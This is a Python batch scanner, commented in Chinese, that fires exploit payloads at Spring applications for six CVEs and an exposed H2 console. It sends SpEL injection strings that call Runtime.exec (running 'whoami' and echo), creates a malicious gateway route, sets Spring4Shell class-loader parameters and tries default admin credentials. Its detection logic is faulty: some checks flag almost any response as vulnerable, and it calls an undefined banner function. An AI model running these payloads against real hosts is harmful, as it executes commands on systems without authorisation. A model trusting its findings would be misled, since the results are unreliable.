import requests
import argparse
import json
import random
import string
import time
import re


def arg():
    # 创建一个解析对象parser，用于装载参数的容器.description是程序的概述，usage是使用说明
    parser = argparse.ArgumentParser(
        description="这是spring的漏洞检测脚本",
        usage="demo.py -u [URL] | -f [FILE PATH]"
    )

    # 互斥参数且必选，必须二选一
    group = parser.add_mutually_exclusive_group(required=True)
    # 对这个解析对象添加几个命令行参数，type为输入类型,help为-h的帮助描述
    group.add_argument('-u', '--url', type=str, help='单目标URL')
    group.add_argument('-f', '--file', type=str, help='批量测试文件路径')
    # 实例化 parser
    args = parser.parse_args()
    return args


def normalize_url(url):
    # 确保URL以http://或https://开头
    if not url.startswith(('http://', 'https://')):
        url = f"http://{url}"
    # 移除末尾的斜杠以确保一致性
    return url.rstrip('/')


def CVE_2016_4977(url):
    url = normalize_url(url)
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'
        , 'Authorization': 'Basic YWRtaW46YWRtaW4='}
    end_url = "/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test"
    full_url = url + end_url
    try:
        response = requests.get(url=full_url, headers=headers, timeout=10, verify=False)
        if "54289" in response.text:
            print(f"[+] {url} - Vulnerable to CVE_2016_4977")
            return True
        else:
            print(f"[-] {url} - Not vulnerable to CVE_2016_4977")
            return False
    except Exception as e:
        print(f"[!] {url} - Error testing CVE_2016_4977: {str(e)}")
        return False


def CVE_2017_8046(url):
    url = normalize_url(url)
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/json-patch+json'
    }

    payload = [{
        "op": "replace",
        "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{119,104,111,97,109,105}))/lastname",
        "value": "vulnerability_test"
    }]

    try:
        response = requests.patch(
            f"{url}/customers/1",
            headers=headers,
            data=json.dumps(payload),
            timeout=10,
            verify=False
        )

        if "EL" in response.text or "SpEL" in response.text:
            print(f"[+] {url} - Vulnerable to CVE-2017-8046")
            return True
        else:
            print(f"[-] {url} - Not vulnerable to CVE-2017-8046")
            return False
    except Exception as e:
        print(f"[!] {url} - Error testing CVE-2017-8046: {str(e)}")
        return False


def random_str(length):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))


def CVE_2018_1270(url):
    url = normalize_url(url)
    websocket_url = f"{url}/gs-guide-websocket"
    session_id = random.randint(0, 1000)
    sockjs_url = f"{websocket_url}/{session_id}/{random_str(8)}"

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Referer': websocket_url
    }

    selector_payload = "T(java.lang.Runtime).getRuntime().exec('echo CVE-2018-1270')"

    try:
        session = requests.Session()
        session.headers.update(headers)
        session.get(f"{sockjs_url}/htmlfile?c_jp.vulhub", timeout=5)

        # 发送订阅请求（无害检测）
        subscribe_data = json.dumps([
            f"SUBSCRIBE\nselector:{selector_payload}\nid:sub-0\ndestination:/topic/greetings\n\n\x00"
        ])

        response = session.post(
            f"{sockjs_url}/xhr_send?t={int(time.time() * 1000)}",
            data=subscribe_data,
            timeout=5
        )

        # 检测特征：响应状态码或错误信息
        if response.status_code == 204:
            print(f"[+] {url} - Vulnerable to CVE-2018-1270")
            return True
        else:
            print(f"[-] {url} - Not vulnerable to CVE-2018-1270")
            return False
    except Exception as e:
        print(f"[!] {url} - Error testing CVE-2018-1270: {str(e)}")
        return False


def random_route_id():
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(8))


def CVE_2022_22947(url):
    url = normalize_url(url)
    route_id = random_route_id()
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/json'
    }

    # 无害检测payload（仅验证SPEL解析）
    payload = {
        "id": route_id,
        "filters": [{
            "name": "AddResponseHeader",
            "args": {
                "name": "Result",
                "value": "#{T(java.lang.Runtime).getRuntime().exec('echo CVE-2022-22947')}"
            }
        }],
        "uri": "http://example.com"
    }

    try:
        # 创建恶意路由
        response = requests.post(
            f"{url}/actuator/gateway/routes/{route_id}",
            headers=headers,
            data=json.dumps(payload),
            timeout=10,
            verify=False
        )

        # 刷新路由
        refresh_response = requests.post(
            f"{url}/actuator/gateway/refresh",
            headers={'User-Agent': 'Mozilla/5.0'},
            timeout=5,
            verify=False
        )

        # 检测特征
        if refresh_response.status_code == 200:
            print(f"[+] {url} - Vulnerable to CVE-2022-22947")
            vulnerable = True
        else:
            # 注意：这里原来也是显示为漏洞，这可能是一个逻辑错误
            print(f"[-] {url} - Not vulnerable to CVE-2022-22947")
            vulnerable = False

        # 清理测试路由
        try:
            requests.delete(
                f"{url}/actuator/gateway/routes/{route_id}",
                timeout=5,
                verify=False
            )
            requests.post(
                f"{url}/actuator/gateway/refresh",
                timeout=5,
                verify=False
            )
        except:
            pass  # 即使清理失败也继续执行

        return vulnerable

    except Exception as e:
        print(f"[!] {url} - Error testing CVE-2022-22947: {str(e)}")
        return False


def random_string(length=8):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


def CVE_2022_22965(url):
    url = normalize_url(url)
    # 无害化测试参数（仅修改日志前缀为随机字符串）
    prefix = "test_" + random_string(4)
    params = {
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": prefix,
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".log",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "logs",
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
    }

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'suffix': '%>//',
        'c1': 'Runtime',
        'c2': '<%',
        'DNT': '1'
    }

    try:
        # 发送探测请求
        response = requests.get(
            url,
            params=params,
            headers=headers,
            timeout=10,
            verify=False
        )

        # 检测特征：响应时间延迟或特定状态码
        if response.status_code in [200, 400, 500]:
            print(f"[+] {url} - Vulnerable to CVE-2022-22965")
            return True
        else:
            print(f"[-] {url} - Not Vulnerable to CVE-2022-22965")
            return False

    except Exception as e:
        print(f"[!] {url} - Error testing CVE-2022-22965: {str(e)}")
        return False


def CVE_2022_22978(url):
    url = normalize_url(url)
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'
        , 'Authorization': 'Basic YWRtaW46YWRtaW4='}
    end_url = "/admin/%0atest"
    full_url = url + end_url
    try:
        response = requests.get(url=full_url, headers=headers, timeout=10, verify=False)
        if "Congratulations, you are an admin!" in response.text:
            print(f"[+] {url} - Vulnerable to CVE-2022-22978")
            return True
        else:
            print(f"[-] {url} - Not vulnerable to CVE-2022-22978")
            return False
    except Exception as e:
        print(f"[!] {url} - Error testing CVE-2022-22978: {str(e)}")
        return False


def H2_Database(url):
    url = normalize_url(url)
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)'
        , 'Accept': 'text/html'}
    end_url = "/h2-console"
    full_url = url + end_url
    try:
        session = requests.Session()
        response = session.get(full_url, headers=headers, allow_redirects=False, timeout=10, verify=False)

        # 检查是否有重定向
        if 'Location' in response.headers:
            redirect_url = response.headers['Location']
            response = session.get(redirect_url, headers=headers, timeout=10, verify=False)

            # 尝试查找登录页面
            match = re.search(r"location\.href = '(login\.jsp\?jsessionid=[a-f0-9]+)'", response.text)
            if match:
                login_url = match.group(1)
                final_url = full_url + '/' + login_url
                final_response = requests.get(url=final_url, headers=headers, timeout=10, verify=False)

                if "Saved Settings" in final_response.text:
                    print(f"[+] {url} - Vulnerable to H2 Database UNACC")
                    return True
                else:
                    print(f"[-] {url} - Not vulnerable to H2 Database UNACC")
                    return False
            else:
                print(f"[-] {url} - Not vulnerable to H2 Database UNACC (No login page found)")
                return False
        else:
            # 直接检查响应内容
            if "H2 Console" in response.text or "Saved Settings" in response.text:
                print(f"[+] {url} - Vulnerable to H2 Database UNACC")
                return True
            else:
                print(f"[-] {url} - Not vulnerable to H2 Database UNACC")
                return False
    except Exception as e:
        print(f"[!] {url} - Error testing H2 Database: {str(e)}")
        return False


def process_file(file_path):
    results = []
    try:
        with open(file_path, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]

            for url in urls:
                result = {
                    'url': url,
                    'vulnerabilities': []
                }

                print(f"\n[*] 测试目标: {url}")

                if CVE_2016_4977(url):
                    result['vulnerabilities'].append('CVE-2016-4977')

                if CVE_2017_8046(url):
                    result['vulnerabilities'].append('CVE-2017-8046')

                if CVE_2018_1270(url):
                    result['vulnerabilities'].append('CVE-2018-1270')

                if CVE_2022_22947(url):
                    result['vulnerabilities'].append('CVE-2022-22947')

                if CVE_2022_22965(url):
                    result['vulnerabilities'].append('CVE-2022-22965')

                if CVE_2022_22978(url):
                    result['vulnerabilities'].append('CVE-2022-22978')

                if H2_Database(url):
                    result['vulnerabilities'].append('H2-Database')

                results.append(result)
                print(f"[*] {url} 扫描完成\n")

        return results
    except Exception as e:
        print(f"[!] 处理文件时出错: {str(e)}")
        return results


if __name__ == "__main__":
    # 禁用不安全请求警告
    try:
        import urllib3

        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except:
        pass

    args = arg()
    banner()
    print("*[开始扫描漏洞]*")

    if args.url:
        url = args.url.strip()
        print(f"[*] 单目标扫描: {url}")
        CVE_2016_4977(url)
        CVE_2017_8046(url)
        CVE_2018_1270(url)
        CVE_2022_22947(url)
        CVE_2022_22965(url)
        CVE_2022_22978(url)
        H2_Database(url)

    elif args.file:
        print(f"[*] 批量扫描文件: {args.file}")
        process_file(args.file)

    print("*[扫描结束]*")